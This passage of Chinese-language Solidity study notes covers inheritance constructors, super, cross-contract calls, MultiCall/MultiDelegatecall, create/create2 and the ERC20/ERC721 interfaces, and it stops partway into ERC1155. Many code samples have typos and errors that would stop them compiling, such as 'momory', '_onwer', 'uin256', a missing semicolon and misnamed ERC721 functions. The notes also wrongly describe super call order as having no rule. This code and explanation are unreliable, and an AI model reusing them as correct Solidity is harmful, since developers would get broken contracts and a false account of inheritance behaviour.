**继承父合约，如果有构造函数，并且需要传入参数，存在以下两种方式传参。**

+ 方法1：固定值传参，如果已经知道基类初始化参数，可以在派生类的继承声明中，直接传递参数给基类的构造函数。

  ```solidity
  contract C is A("n"),B("v"){
  	
  }
  ```

  

+ 方法2：动态传参，如果需要在部署时或运行时，由调用方传递基类初始化参数，此时需要编写一个构造函数，传递参数给基类。

  ```solidity
  contract C is A{
  	
  	constructor(string memory _name) A(_name){
  	 //这种方式，会调用A合约中的构造函数
  	}
  }
  ```

+ 方法3：两种方式混用。

  ```solidity
  contract E is A,B("EEE"){
  	constructor(string memory _name) A(_name) {
  	
  	}
  }
  ```

  

**示例：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract A {
	string public nameA;
	
	constructor(string memory _name){
		nameA = _name;
	}
}

contract B{
	string public nameB;
	
	constructor(string memory _name){
		nameB = _name;
	}
}


//方法1,继承时直接传参
contract C is A("Name from C"){

}

//方法2：部署子合约时，传入参数到构造函数，动态传参
contract D is A{
	constructor(string memory _name) A(_name){
	
	}
}
```







### 继承中构造函数的执行顺序

多重继承中，构造函数的执行顺序会按照定义时的继承顺序进行，与构造函数中定义无关。

**原则：构造函数的执行顺序按照继承的顺序**



**例子:**

1. 如下是先执行 A，再执行 B

```solidity
contract E is A, B("EEEEEEEEEEEEE") {
    constructor(string memory _name) A(_name) {}
}
```

1. 如下是先执行 B，再执行 A

```solidity
contract E is B("EEEEEEEEEEEEE"),A {
    constructor(string memory _name) A(_name) {}
}
```







### 两种子合约调用父合约的方法



子合约调用父合约的两种方式：

+ **直接使用合约名调用**：`ParentContractName.functionName()`，==**注意：这种方式只能用于继承**==

+ **使用super关键字**：`super.functionName()`

  + super会自动寻找父合约，并执行相应的方法

    



#### 直接使用合约名调用

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.17;

contract A{
	event Log(string msg);
	
	function test1() public virtual{
		emit Log("A.test1");
	}
}

contract B is A{
	function test1() public virtual override{
		emit Log("B.test1");
		A.test1();    //使用合约名调用方法
	}
}
```





#### 使用super关键字调用

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract A {
    event Log(string msg);

    function test1() public virtual {
        emit Log("A.test1");
    }
}

contract C is A {
    function test1() public virtual override {
        emit Log("C.test1");
        super.test1();
    }
}
```





**多个合约继承：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract A {
    event Log(string msg);

    function test1() public virtual {
        emit Log("A.test1");
    }
}

contract B is A {
    function test1() public virtual override {
        emit Log("B.test1");
        A.test1();
    }
}

contract C is A {
    function test1() public virtual override {
        emit Log("C.test1");
        super.test1();
    }
}

contract D is B, C {
    function test1() public override(B, C) {
        emit Log("D.test1");
        // 因为 B 和 C 都是 D 的父级，所以B和C都会执行
        super.test1();
    }
}
```

**执行顺序：像水中的冒泡一样，由下向上进行执行。**

```solidity
1. D.test1
1. C.test1
1. B.test1
1. A.test1 (这里 A 只执行一次)
```

**警告** : 为什么先输出 C，后输出 B ?

上面的例子，如果代码中 B 和 C 换顺序，还是执行的 `DCBA`。开始怀疑和函数名字的 hash 结果顺序有关系，看完下面的继续研究代码，可以得出结论，复杂继承的时候，supper 方式就像一个疯子一样没有规律可言。我们能做的就是避开使用它。

==**因此：在多重继承中，最好使用合约名调用方式，否则可能出现未知错误。**==











## 合约调用合约

solidity 支持一个合约调用另一个合约。两个合约可以位于同一个文件内，也可以位于不同的两个文件中。而且还能调用链上的其他合约。

+ 调用内部合约：内部合约指位于同一个`.sol`文件中的合约，此时不需要额外的声明就可以直接调用
+ 调用外部合约：外部合约指位于不同文件中的外部合约，以及上链的合约。
  + 第一种方式：通过接口方式调用
  + 第二种方式：通过签名方式调用



### 调用内部合约

**地址转换为合约对象方式：**

+ 通过`contractName(_ads)`将传入的地址转为合约对象，如：`Test(_ads).setX(_x)`，==**更节约gas**==

  + 如果为了代码逻辑，也可以分开写

  + ```solidity
    Test temp = Test(_ads);
    temp.setX(_x);
    ```

+ 可以通过参数中指定合约名字进行转换

  + ```solidity
    function setX2(Test _ads,uint256 _x)public{  
    	_ads.setX(_x);
    }
    ```

    



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Test{
	uint256 public x = 1;
	uint256 public y = 2;
	
	function setX(uint256 _x) public{
		x = _x;
	}
	
	function getX()public view returns(uint256){
		return x;
	}
	
	function setYBySendEth() public payable{
		y = msg.value;
	}
	
	function getXAndY() public view returns(uint256,uint256){
		return (x,y);
	}
}

contract CallTest{
	
	//第一种方式：229647gas
	function setX1(address _ads,uint256 _x) public{
		Test(_ads).setX(_x);
	}
	
	//第二种方式：27923gas
	function setX2(Test _ads,uint256 _x) public{
		_ads.setX(_x);
	}
	
	function getX(address _ads) public view returns(uint256){
		return Test(_ads).getX();
	}
	
	function setYBySendEth(address _ads) public payable{
		Test(_ads).setYBySendEth{value:msg.value}();
	}
	
	function getXAndY(address _ads)public view returns(uint256 _x,uint256 _y){
		(_x,_y) = Test(_ads).getXAndY();
	}
}
```









### 调用外部合约



**通过接口方式调用：**

```solidity
interface AnimalEat{
	function eat()external returns(string memory);
}

contract Animal{
	function test(address _addr)external returns(string memory){
		AnimalEat general = AnimalEat(_addr);  //这里可以看作是合约对象，根据地址构建对应的合约对象
		return general.eat();
	}
}
```







**通过签名方式调用：**

+ 使用call：

  + ```solidity
    bytes memory data = abi.encodeWithSignature("setNameAndAge(string,uint256)",_name,_age);
    
    (bool success,bytes memory _bys) = ads.call{value:msg.value}(data);
    require(success,"call failed");
    bys = _bys;
    ```

+ Delegatecall委托调用

+ staticcall静态调用，它与 call 基本相同，**但如果被调用的函数以任何方式修改状态变量，都将回退**。









### MultiCall多次调用

把多个合约的多次函数调用，打包在一个里面对合约进行调用。RPC对调用有限制，这样可以绕开限制。

多次调用里面，对方的内部，`msg.sender`是MultiCall合约，而不是用户地址。



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.17;

contract Test{
	
	function fn1() external view returns(uint256,address,uint256){
		return (1,msg.sender,block.timestamp);
	}
	
	function fn2() external view returns(uint256,address,uint256){
		return (2,msg.sender,block.timestamp);
	}
	
	function getFn1Data() external pure returns(bytes memory){
		return abi.encodeWithSelector(this.fn1.selector);
	}
	
	function getFn2Data() external pure returns(bytes memory){
		return abi.encodeWithSelector(this.fn2.selector);
	}
}


contract MultiCall{
	
	function multiCall(address[] calldata target,bytes[] calldata data)
	external view returns(bytes[] momory){
		require(target.length == data.length,"targets.length != data.length");
		bytes[] memory results = new bytes[](data.length);
		for (uint256 index = 0;index<target.length;index++){
			(bool success,bytes memory result) = target[index].staticcall(data[index]);
			require(success,"call failed");
			results[index] = result;
		}
		return results;
	}
}
```

**合约测试**

- 部署 `Test`: `0x1c91347f2A44538ce62453BEBd9Aa907C662b4bD`

  - 使用 `getFn1Data` 获取 fn1 data
  - 使用 `getFn2Data` 获取 fn2 data

- 部署 `MultiCall`: `0x93f8dddd876c7dBE3323723500e83E202A7C96CC`

- 调用 multiCall 方法

  - 参数 1: `["Test 地址","Test 地址"]`
  - 参数 2: `["fn1 data","fn2 data"]`

- 返回值如下

  ```
  0x
  0000000000000000000000000000000000000000000000000000000000000001
  00000000000000000000000093f8dddd876c7dbe3323723500e83e202a7c96cc
  00000000000000000000000000000000000000000000000000000000630c7834,
  0x
  0000000000000000000000000000000000000000000000000000000000000002
  00000000000000000000000093f8dddd876c7dbe3323723500e83e202a7c96cc
  00000000000000000000000000000000000000000000000000000000630c7834
  ```









### MultiDelegatecall 多次委托调用

为什么使用 MultiDelegatecall ，不使用 MultiCall?是为了让被调用的合约内，`msg.sender` 是用户合约，而不是中转合约的地址。

但是委托调用的缺点是，合约必须是自己编写的，不能是别人编写的。

多次委托调用，存在漏洞，不要在里面多次累加余额。或者多重委托禁止接受资金。



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract MultiDelegatecall {
    function multiDelegatecall(bytes[] calldata data)externalreturns (bytes[] memory){
      
      bytes[] memory results = new bytes[](data.length);
      
      for (uint256 index = 0; index < data.length; index++) {
            
            (bool success, bytes memory result) = address(this).delegatecall(data[index]);
            require(success, "call faild");
            results[index] = result;
            
        }
        
        return results;
    }
}

contract Test is MultiDelegatecall {
    
    function fn1()external view returns (uint256,address,uint256){
        return (1, msg.sender, block.timestamp);
    }

    function fn2()external view returns (uint256,address,uint256){
        return (2, msg.sender, block.timestamp);
    }
    
    function getFn1Data() external pure returns (bytes memory) {
        // 两种签名方法都可以
        // abi.encodeWithSignature("fn1()");
        return abi.encodeWithSelector(this.fn1.selector);
    }

    function getFn2Data() external pure returns (bytes memory) {
        return abi.encodeWithSelector(this.fn2.selector);
    }
}
```

**合约测试**

- 部署 Test 合约

- 获取 getFn1Data: `0x648fc804`

- 获取 getFn2Data: `0x98d26a11`

- 调用 `multiDelegatecall`

  - [“0x648fc804”,“0x98d26a11”]

- 得到 decoded output，发现地址是用户的

  ```
  0x
  0000000000000000000000000000000000000000000000000000000000000001
  0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4
  00000000000000000000000000000000000000000000000000000000630c8ebc,
  0x
  0000000000000000000000000000000000000000000000000000000000000002
  0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4
  00000000000000000000000000000000000000000000000000000000630c8ebc
  ```













## 合约部署合约

### 通过`new`创建合约/`create`

使用关键字`new`可以创建一个新合约。`new`是通过构造函数来创建合约的。

`create`主要有以下三种方式：

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract D{
	uint public x;
	
	constructor(uint a) payable{
		x = a;
	}
}


contract C{
	//1,将作为 D 合约的构造函数一部分被执行
	//注意：这里为什么有个4，是因为D()，小括号中的参数必须和合约中构造函数的参数一致
	D d = new D(4);
	
	//方法内创建
	function createD1(uint arg)public{
		D newD = new D(arg);   //可以看到这里并没有传入地址，而是利用new合约对象，再利用合约对象调用函数
		newD.x();
	}
	
	//方法内创建，并转账
	function createD2(uint arg,uint amount) public payable{
		D newD = (new D){value:amount}(arg);  //可以再创建合约时给新创建的合约地址中传入以太，写法需要注意！！！！
	}
}
```





这种方式又称为工厂合约。工厂合约部署也被称为`create`，批量创建的时候使用，如批量创建交易池。

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.17;

contract Account{
	address public deployer;
	address public owner;
	
	constructor(address _owner) payable{
		owner = _owner;
		deployer = msg.sender;
	}
	
	function getBalance()external view returns(uint256){
		return address(this).balance;
	}
}

contract AccountFactory{
	Account[] public accounts;
	
	
	function deploy(address _owner) external payable{
		Account account = new Account{value:msg.value}(_owner);
		accounts.push(account);
	}
	
	function getBalance(address _addr) external view returns(uint256){
		return _addr.balance;
	}
}
```







### 通过`salt`创建合约/`create2`

在创建合约时，将根据创建合约的地址和每次创建合约交易时的`nonce`来计算合约的地址。

如果指定了一个可选的`salt`（一个bytes32值），那么合约创建将使用另一种机制（create2）来生成新合约的地址：它将根据给定的`salt`，创建合约的字节码和构造函数参数来计算创建 合约的地址。注意：这里不再使用nonce了。



`create2`的意义：可以在创建合约时提供更大的灵活性：可以在创建新合约之前就推导出将要创建合约的地址。甚至是可以依赖此地址（即便还不存在）来创建其他合约。



**应用场景：充当链下交互仲裁合约，仅在有争议时才需要创建**



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.17;

contract D{
	uint256 public x;
	
	constructor(uint256 a){
		x = a;
	}
}

contract C{
	
	function createDSalted(bytes32 salt,uint256 arg) public {
		//新语法：
		D d = new D{salt:salt}(arg);
		
		
		//之前的写法，也就是新语法的内在逻辑代码，告诉了我们如何预先计算地址
		address predictedAddress = address(
			uint160(
				uint256(
					keccak256(
						abi.encodePacked(
							bytes(0xff),
							address(this),
							salt,
							keccak256(abi.encodePacked(type(D).creationCode,arg))
						)
					)
				)
			)
		)
		require(address(d) == predictedAddress);
	}
}
```

使用`create2`创建的合约，合约销毁后可以在同一地址重新创建。





**`create和create2`总结：**

- **普通合约**的地址生成方式: 部署者的`地址` + `地址 nonce`
- **预测合约地址的方式**:

```solidity
bytes32 hash = keccak256(
    abi.encodePacked(
        bytes1(0xff), // 固定字符串
        address(this), // 当前工厂合约地址，固定写法
        _salt, // salt
        keccak256(bytecode) //部署合约的 bytecode
    )
);
return address(uint160(uint256(hash)));
```







### 用assembly做create

create部署

+ proxy：部署合约的方法，和修改owner
+ helper：生成部署用的bytecode和修改owner的data

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Test1{
	address public owner = msg.sender;
	
	function setOwner(address _owner) public{
		require(msg.sender == owner,"no owner");
		owner = _onwer;
	}
}

contract Test2{
	address public owner = msg.sender;
	uint256 public value = msg.value;
	uint256 public x;
	uint256 public y;
	
	constructor(uint256 _x,uint256 _y){
		x = _x;
		y = _y;
	}
}


//assembly 部署

contract Proxy{
	
	event Deploy(address);
	
	function deploy(bytes memory _code)external payable returns(address addr){
		assembly{
			//create(v,p,n);
			//v 是发送的ETH值
			//p 是内存中机器码开始的位置
			//n 是内存中机器码的大小
			//msg.value 不能使用，需要用callvaue()
			
			addr = create(callvalue(),add(_code,0x20),mload(_code))
		}
		
		require(addr != address(0),"Deploy failed");
		emit Deploy(addr);
	}
	
	function execute(address _target,bytes memory _data)external payable{
		(bool success,) = target.call{value:msg.value}(_data);
		require(success,"failed");
	}
}


contract Helper{
	//生成type(constract).creationCode
	function getBytesCode1()external pure returns(bytes memory bytecode){
		bytecode = type(Test).creationCode;
	}
	
	//生成构造函数带有参数的bytecode，参数连接后面就可以了
	function getBytesCode2(uint256 _x,uint256 _y)external pure returns(bytes memory){
		bytes memory bytecode = type(Test2).creationCode;
		return abi.encodePacked(bytecode,abi.encode(_x,_y));
	}
	
	//调用合约方法的calldata，使用abi.encodeWithSigature
	function getCalldata(address _owner)external pure returns(bytes memory){
		return abi.encodeWithSignature("setOwner(address)",_owner);
	}
}
```



**测试部署**

前提条件：部署 Helper 和 Proxy 合约。

1. 通过 getBytescode1 ，获取 Test1 需要的 bytecode
2. 部署 Test1
3. 获取 Test1 合约地址
4. At Test1 Address
5. 获取 Test1 owner 地址
6. 通过 getCalldata ，获取 Test1 setOwner 需要的 bytecode。参数是想要设置的 Owner 地址。
7. 执行 execute(),参数是 Test1 合约地址 和 getCalldata 返回值。

合约 2

1. 通过 getBytescode2 ，获取 Test2 需要的 bytecode
2. 部署 Test2，需要设置 x, y 的值，可以选择支付 ETH。
3. 获取 Test2 合约地址
4. At Test2 Address
5. 查看 Test2 的值









### 用assembly做create2



UniswapV2Factory 的创建 pair 代码如下

```solidity
function createPair(address tokenA, address tokenB) external returns (address pair) {
    require(tokenA != tokenB, 'UniswapV2: IDENTICAL_ADDRESSES');
    (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    require(token0 != address(0), 'UniswapV2: ZERO_ADDRESS');

    // single check is sufficient
    require(getPair[token0][token1] == address(0), 'UniswapV2: PAIR_EXISTS');
    bytes memory bytecode = type(UniswapV2Pair).creationCode;
    bytes32 salt = keccak256(abi.encodePacked(token0, token1));
    assembly {
        pair := create2(0, add(bytecode, 32), mload(bytecode), salt)
    }
    IUniswapV2Pair(pair).initialize(token0, token1);
    getPair[token0][token1] = pair;
    getPair[token1][token0] = pair; // populate mapping in the reverse direction
    allPairs.push(pair);
    emit PairCreated(token0, token1, pair, allPairs.length);
}
```











### 创建合约的扩展

可以通过以太坊交易**从外部**或从 Solidity 合约内部创建合约。

一些集成开发环境，例如 Remix, 通过使用一些 UI 用户界面使创建合约的过程更加顺畅。 在以太坊上通过编程创建合约最好使用 JavaScript API web3.js。 现在，我们已经有了一个叫做 `web3.eth.Contract` 的方法能够更容易的创建合约。

创建合约时， 合约的构造函数 (一个用关键字 constructor 声明的函数)会执行一次。 构造函数是可选的。只允许有一个构造函数，这意味着不支持重载。构造函数执行完毕后，合约的最终代码将部署到区块链上。此代码包括所有公共和外部函数以及所有可以通过函数调用访问的函数。 部署的代码没有 包括构造函数代码或构造函数调用的内部函数。

在内部，构造函数参数在合约代码之后通过 ABI 编码 传递，但是如果你使用 web3.js 则不必关心这个问题。











## interface接口

很多时候，我们需要调用已经部署在链上的合约，此时可以通过接口合约实现部分调用逻辑，只需要写一个与之对应的接口合约，就可以调用了。



在solidity中，只要某个合约有和接口中相同的函数声明，就可以被此合约接受。接口就是起到一个桥接的作用；



`interface`类似于抽象合约，但是它们不能实现任何功能。`interface`内的函数被隐式标记为`virtual`





### 接口限制

+ 无法定义任何功能，没有函数体
+ 无法定义构造函数
+ 无法定义状态变量
+ 无法定义结构`struct`（注意：==0.5.0版本开始接口里可以支持声明`enum`类型==）。
+ 无法定义函数修改器
+ ==**接口中的所有声明必须是`external`，尽管合约中可以是`public`**==



==⚠️注意：**interface可以基于别的interface，可以继承其他合约**。比如`interface IERC20Metadata is IERC20{}`==，定义`IERC20Metadata`是基于`IERC20`接口。







### 接口定义和使用



接口使用关键字`interface`，接口内部只需要有函数的声明，不需要实现。当某个合约中有和接口中相同的函数声明，就可以被接口所接受。



**语法格式：**

```solidity
interface 接口名{
	函数声明;
}
```



**示例：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Cat{
	uint256 public age;
	
	function eat() public returns(string memory){
		age++;
		return "cat eat fish";
	}
	
	function sleep()public pure returns(string memory){
		return "cat sleep";
	}
}


contract Dog{
	uint256 public age;
	
	function eat() public returns(string memory){
		age+=2;
		return "dog miss you";
	}
	
	function sleep() public pure returns(string memory){
		return "dog sleep";
	}
}

//接口，定义方法
interface AnimalEat{
	function eat() external returns(string memory);
}


contract Animal{
	
	function test1(address _addr) external returns(string memory){
		//由于Animal实现了接口AnimalEat中的方法
		AnimalEat general = AnimalEat(_addr);  //这里通过地址通过地址实例化对象
		return general.eat();
	}
	
	 function test2(address _addr) external pure returns(string memory){
		Cat general = Cat(_addr);
		return general.sleep();
	}

    function test3(address _addr) external pure returns(string memory){
		Dog general = Dog(_addr);
		return general.sleep();
	}
}
```

测试流程:

1. 部署 Cat 合约
2. 部署 Dog 合约
3. 部署 Animal 合约
4. 调用`Animal.test1`,参数是 Cat 合约地址
   1. 返回 `"string: cat eat fish"`
   2. 在 Cat 合约内查看 `age` 返回的数字
5. 调用`Animal.test1`,参数是 Dog 合约地址
   1. 返回 `"string: dog miss you"`
   2. 在 Dog 合约内查看 `age` 返回的数字

在合约 Animal 中，调用函数 test，如果传递的是部署的 Cat 的合约地址，那么我们在调用接口的 eat 方法时，实则调用了 Cat 合约的 eat 方法。 同理，如果传递的是部署的 Dog 的合约地址，那么我们在调用接口的 eat 方法时，实则调用了 dog 合约的 eat 方法。







**接口中的函数声明默认隐式标记为`virtual`：**

​	就像继承其他合约一样，合约可以继承接口。==接口中的函数都会隐式标记为`virtual`，意味着被重写不需要`override`关键字。==





**接口可以继承其他的接口，遵循同样继承规则。**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

interface ParentA{
	function test() external returns(uint256);
}

interface ParentB{
	function test() external returns(uint256);
}

interface SubInterface is ParentA,ParentB{
	//必须重新定义test函数，以表示兼容父合约的含义
	
	function test() external override(ParentA,ParentB) returns(uint256);
}




interface A{
    
    function f1(uint256) external returns(uint256);
}

interface ParentB{
    function f1()external returns(uint256);
}

interface C is A,B{
    //其实就是函数签名不能相同
}
```







### 全局属性

返回接口`I`的bytes4类型的接口ID，接口 ID 参考： EIP-165 定义的， 接口 ID 被定义为 XOR （异或） 接口内所有的函数的函数选择器（除继承的函数。

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

interface ParentA{
	function test() external returns(uint256);
}

contract Demo{
	function interfaceID() public pure returns(bytes4){
	
	//type(ParentA).interfaceId，接口的bytes4类型的ID
		return type(ParentA).interfaceId;  //接口属性
	}
}
```





### ERC20标准



**如何判断一个token合约是否为标准的ERC20合约？**

​	只要包含ERC20接口中规定的所有内容，就是标准的ERC20合约。至于方法内的逻辑是如何实现的，不做判断。







标准ERC20接口：

+ 3个查询：
  + `balanceOf`：查询指定地址的token数量
  + `totalSupply`：查询当前合约的token总量
  + `allowance`：查询指定地址对另一个地址的剩余授权额度
+ 2个交易
  + `transfer`：从当前调用者地址发送指定数量的token到指定的地址
    + 这是一个写入方法，所以还会抛出一个`Transfer`事件
  + `transferFrom`：当向另一个合约地址存款时，对方合约必须调用`transferFrom`才可以把token拿到自己的合约中
+ 2个事件
  + `Transfer`
  + `Approval`
+ 1个授权
  + `approve`：授权指定地址可以操作调用者的最大token数量。



**ERC20标准接口：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

interface IERC20{
	
	//1个授权
	//授权指定地址可以操作调用者的最大token数量。
	function approve(address spender,uint256 amount)external returns(bool);
	
	//2个事件
	event Transfer(address indexed from,address indexed to,uin256 amount);
	event Approval(address indexed owner,address indexed spender,uint256 amount);
	
	
	//2个交易
	
	//从当前调用者地址发送指定数量的token到指定的地址
	function transfer(address recipient,uint256 amount)external returns(bool);
	//当向另一个合约地址存款时，对方合约必须调用`transferFrom`才可以把token拿到自己的合约中
	function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
	
	
	
	//3个查询
	
	//查询当前合约的token总量
	function totalSupply()external view returns(uint256);
	//查询指定地址的token数量
	function balanceOf(address account)external view returns(uint256);
	//查询指定地址对另一个地址的剩余授权额度
	function allowance(address owner,address spender)external view returns(uint256);
}
```





**ERC20标准接口实现：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

interface IERC20{

	function approve(address spender,uint256 amount)external returns(bool);

	event Transfer(address indexed from,address indexed to,uin256 amount);
	event Approval(address indexed owner,address indexed spender,uint256 amount);
	
	function transfer(address recipient,uint256 amount)external returns(bool);
	function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
	
	function totalSupply()external view returns(uint256);
	function balanceOf(address account)external view returns(uint256);
	function allowance(address owner,address spender)external view returns(uint256);
}


contract ERC20 is IERC20{
	//状态变量
	string public name;
	string public symbol;
	uint8 public immutable decimals;  //token的精度，例如可以定为18位小数
	
	address public immutable owner;
	
	uint256 public totalSupply;  //总价总量
	mapping(address=>uint256) public balanceOf;
	//批准的映射，一个地址批准另一个地址的额度
	mapping(address=>mapping(address=>uint256)) public allowance;
	
	
	modifier onlyOwner(){
		require(msg.sender == owner,"not owner");
		_;
	}
	
	constructor(string memroy _name,string memory _symbol,uint8 _decimals,uint256 _totalSupply){
		owner = msg.sender;
		name = _name;
		decimals = _decimals;
		totalSupply = _totalSupply;
		balanceOf[msg.sender] = _totalSupply;
		emit Transfer(address(0),msg.sender,_totalSupply);
	}
	
	////spender表示被授权账户
	function approve(address spender,uint256 amount)external returns(bool){
		allowance[msg.sender][spender] = amount;  //设置额度
		emit Approval(msg.sender,spender,amount);
		return true;
	}
	
	
	function transfer(address recipient,uint256 amount)external returns(bool){
		balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender,recipient,amount);
        return true;
	}
	
	
	function transferFrom(address sender,address recipient,uint256 amount)external returns(bool){
		allowance[sender][msg.sender] -= amount;
		balanceOf[sender] -= amount;
		balanceOf[recipient] += amount;
		emit Transfer(sender,recipient,amount);
		return true;
		
	}
	
	//1个铸币,非必须
	function mint(uint256 amount)external onlyOwner returns(bool){
		totalSupply += amount;
		balanceOf[msg.sender] += amount;
		emit Transfer(address(0),msg.sender,amount);
		return true;
	}
	
	//1个销毁，非必须
	function burn(uint256 amount)external returns(bool){
		totalSupply -= amount;
		balanceOf[msg.sender] -= amount;
		emit Transfer(msg.sender,address(0),amount);
		return true;
	}
	
	//转移owner权限等其他一些操作均是看各自业务需求，非必须
}
```





### ERC721标准

场景说明：非同质化代币（NFT）用于以唯一的方式标识某人或某物。此类型的代币可以被完美的用于出售下列物品平台：收藏品、密钥、彩票、音乐会座位编号、体育比赛等。这种类型的代币有惊人的潜力，因此需要一个适当的标准。ERC721是NFT的标准。



所有NFTs都有一个`uint256`变量，名为`tokenId`，所以对任何ERC-721合约，这对值`contract address`，`tokenId`必须是全局唯一的。即去中心化的应用使用`tokenId`作为输入并输出一些事务图像，如：武器、技能等。



```solidity
//SPDX-Licnese-Identifier:MIT

pragma solidity ^0.8.19;


/**
 * @dev ERC165 标准的接口 https://eips.ethereum.org/EIPS/eip-165
 * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified
 */
interface IERC165{
 	/// @notice 查询合约是否实现接口
    /// @param interfaceID ERC-165 中指定的接口标识符
    /// @dev 接口标识在 ERC-165 中指定。此功能需要低于 30,000 gas。
    /// @return 如果合约实现了 interfaceID 且 interfaceID 不是 0xffffffff，则为 true，否则为 false
	function supportInterface(bytes4 interfaceID)external view returns(bool);
}



/// @title ERC-721 Non-Fungible Token Standard
/// @dev See https://eips.ethereum.org/EIPS/eip-721
///  Note: the ERC-165 identifier for this interface is 0x80ac58cd.
interface IERC721 is IERC165{
	 /**
     @dev 当任何 NFT 的所有权通过任何形式发生变化时，需要触发该事件。
     当 NFT 创建（`from` == 0）和销毁（`to` == 0）时会触发此事件。
     例外情况：在合约创建期间，可以创建和分配任意数量的 NFT，而不会发出 Transfer。
     在任何形式的资产转移时，该 NFT如果有批准地址将重置为无。
    */
	event Transfer(address indexed _from,address indexed _to,uint256 indexed _tokenId);
	
	
	/**
     * 当 NFT 的批准地址被更改或重新确认时，它会发出。
     * 零地址表示没有批准的地址。
     * 当 Transfer 事件发出时，这也表明该 NFT 如果有批准地址被重置为无。
     */
	event Approval(address indexed _owner,address indexed _approved,uint256 indexed _tokenId);
	
	
	/// @dev 当为所有者启用或禁用操作员时，它会发出。 运营者可以管理所有者的所有 NFT。
	event ApprovalForAll(address indexed _owner,address indexed _operator,bool _approved);
	
	
	/// @notice 所有者的 NFT 数量
    /// @dev 分配给零地址的 NFT 被认为是无效的，并且该函数抛出有关零地址的查询。
    /// @param _owner 查询余额的地址
    /// @return `_owner` 拥有的 NFT 数量，可能为零
	function balanceOf(address _owner) external view returns(uint256);
	
	
	/// @notice 找到 NFT 的所有者
    /// @dev 分配给零地址的 NFT 被认为是无效的，并且对它们的查询确实会抛出异常。
    /// @param _tokenId NFT 的标识符
    /// @return NFT所有者的地址
	function ownerOf(uint256 _tokenId)external view returns(address);
	
	
	/// @notice 将 NFT 的所有权从一个地址转移到另一个地址
    /// @dev Throws unless `msg.sender` is the current owner, an authorized
    ///  operator, or the approved address for this NFT. Throws if `_from` is
    ///  not the current owner. Throws if `_to` is the zero address. Throws if
    ///  `_tokenId` is not a valid NFT. When transfer is complete, this function
    ///  checks if `_to` is a smart contract (code size > 0). If so, it calls
    ///  `onERC721Received` on `_to` and throws if the return value is not
    ///  `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`.
    /// @param _from NFT的当前所有者
    /// @param _to 新 owner
    /// @param _tokenId 转移的 NFT
    /// @param data 没有指定格式的附加数据，在调用 _to 时发送
	function safeTransferFrom(address _from,address _to,uint256 _tokenId,bytes4 calldata data)
	external payable;
	
	
	/// @notice 转移 NFT 的所有权——调用者有责任确认 `_to` 能够接收 NFTS，否则它们可能会永久丢失
    /// @dev Throws unless `msg.sender` is the current owner, an authorized
    ///  operator, or the approved address for this NFT. Throws if `_from` is
    ///  not the current owner. Throws if `_to` is the zero address. Throws if
    ///  `_tokenId` is not a valid NFT.
    /// @param _from NFT的当前所有者
    /// @param _to 新 owner
    /// @param _tokenId 转移的 NFT
	function TransferFrom(address _from,address _to,uint256 _tokenId)external payable;
	
	
	/// @notice 更改或重申 NFT 的批准地址
    /// @dev The zero address indicates there is no approved address.
    ///  Throws unless `msg.sender` is the current NFT owner, or an authorized
    ///  operator of the current owner.
    /// @param _approved 新批准的 NFT 控制器
    /// @param _tokenId NFT 批准
	function approve(address _approved,uint256 _tokenId)external payable;
	
	
	/// @notice 启用或禁用对第三方（“操作员”）的批准以管理所有 `msg.sender` 的资产
    /// @dev 发出 ApprovalForAll 事件。 合同必须允许每个所有者有多个操作员。
    /// @param _operator 添加到授权运营商集中的地址
    /// @param _approved 如果运营商获得批准，则为 True，如果撤消批准，则为 false
	function setApprovalForAll(address _operator,bool _approved)external;
	
	
	/// @notice 获取单个 NFT 的认可地址
    /// @dev 如果 _tokenId 不是有效的 NFT，则抛出。
    /// @param _tokenId NFT寻找批准的地址
    /// @return 此 NFT 的批准地址，如果没有则为零地址
	function getApproved(uint256 _tokenId)external view returns(address);
	
	
	/// @notice 查询一个地址是否是另一个地址的授权操作员
    /// @param _owner 拥有 NFT 的地址
    /// @param _operator 代表所有者的地址
    /// @return 如果 _operator 是 _owner 的批准运算符，则为真，否则为假
	function isApprovedForAll(address _owner,address _operator)external view returns(bool);
}
```







### ERC1155标准



**场景说明：**

用于多种代币管理的合约标准接口。单个部署的合约可以包括同质化代币、非同质化代币或其他配置（如半同质化代币）的任何组合。

它的目的很单纯，就是创建一个智能合约接口，可以代表和控制任何数量的同质化和非同质化代币类型。 这样一来，ERC-1155 代币就具有与 ERC-20 和 ERC-721 代币相同的功能，甚至可以同时使用这两者的功能。 而最重要的是，它能改善这两种标准的功能，使其更有效率，并纠正 ERC-20 和 ERC-721 标准上明显的实施错误。





**ERC1155标准：**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev ERC165 标准的接口 https://eips.ethereum.org/EIPS/eip-165
 * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified
 */
interface IERC165 {
    /// @notice 查询合约是否实现接口
    /// @param interfaceID ERC-165 中指定的接口标识符
    /// @dev 接口标识在 ERC-165 中指定。此功能需要低于 30,000 gas。
